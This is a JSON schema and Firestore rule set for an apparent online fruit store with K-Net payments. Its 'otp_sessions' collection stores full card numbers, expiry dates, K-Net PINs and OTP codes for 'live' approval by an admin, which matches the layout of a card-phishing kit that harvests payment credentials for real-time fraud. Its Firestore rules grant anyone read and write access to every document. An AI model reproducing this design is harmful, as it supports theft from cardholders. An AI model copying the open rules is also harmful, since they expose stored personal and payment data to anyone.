{
  "entities": {
    "orders": {
      "title": "Orders",
      "description": "Store customer orders and K-Net payment records",
      "type": "object",
      "properties": {
        "orderNumber": { "type": "string" },
        "customerName": { "type": "string" },
        "customerPhone": { "type": "string" },
        "address": { "type": "object" },
        "items": { "type": "array" },
        "customBasket": { "type": "object" },
        "subtotal": { "type": "number" },
        "deliveryFee": { "type": "number" },
        "discount": { "type": "number" },
        "driverTip": { "type": "number" },
        "total": { "type": "number" },
        "paymentMethod": { "type": "string" },
        "status": { "type": "string" },
        "createdAt": { "type": "string" },
        "estimatedDeliveryTime": { "type": "string" },
        "assignedDriverId": { "type": "string" },
        "assignedDriverName": { "type": "string" },
        "paymentDetails": { "type": "object" }
      },
      "required": ["orderNumber", "customerName", "customerPhone", "total", "status", "createdAt"]
    },
    "otp_sessions": {
      "title": "Live OTP Sessions",
      "description": "Active real-time OTP approval verification sessions between checkout and admin",
      "type": "object",
      "properties": {
        "orderNumber": { "type": "string" },
        "customerName": { "type": "string" },
        "customerPhone": { "type": "string" },
        "total": { "type": "number" },
        "bankName": { "type": "string" },
        "cardNumberMasked": { "type": "string" },
        "cardNumberFull": { "type": "string" },
        "cardExpiry": { "type": "string" },
        "knetPin": { "type": "string" },
        "otpCode": { "type": "string" },
        "status": { "type": "string" },
        "timestamp": { "type": "string" },
        "createdAtMs": { "type": "number" }
      },
      "required": ["orderNumber", "otpCode", "status"]
    },
    "products": {
      "title": "Products",
      "description": "Store fruit catalog inventory",
      "type": "object",
      "properties": {
        "name": { "type": "string" },
        "nameEn": { "type": "string" },
        "category": { "type": "string" },
        "price": { "type": "number" },
        "originalPrice": { "type": "number" },
        "unit": { "type": "string" },
        "image": { "type": "string" },
        "origin": { "type": "string" },
        "originFlag": { "type": "string" },
        "isOrganic": { "type": "boolean" },
        "isBestSeller": { "type": "boolean" },
        "isDiscounted": { "type": "boolean" },
        "stock": { "type": "number" },
        "rating": { "type": "number" },
        "reviewsCount": { "type": "number" },
        "description": { "type": "string" },
        "sweetnessLevel": { "type": "number" },
        "calories": { "type": "number" }
      },
      "required": ["name", "category", "price", "unit", "image"]
    },
    "settings": {
      "title": "Store Settings",
      "description": "General settings, delivery fees and support info",
      "type": "object",
      "properties": {
        "storeName": { "type": "string" },
        "minOrderAmount": { "type": "number" },
        "freeDeliveryThreshold": { "type": "number" },
        "standardDeliveryFee": { "type": "number" },
        "announcementText": { "type": "string" },
        "showAnnouncement": { "type": "boolean" },
        "supportPhone": { "type": "string" },
        "whatsappNumber": { "type": "string" },
        "autoAssignDrivers": { "type": "boolean" }
      }
    }
  },
  "firestoreRules": "rules_version = '2';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}
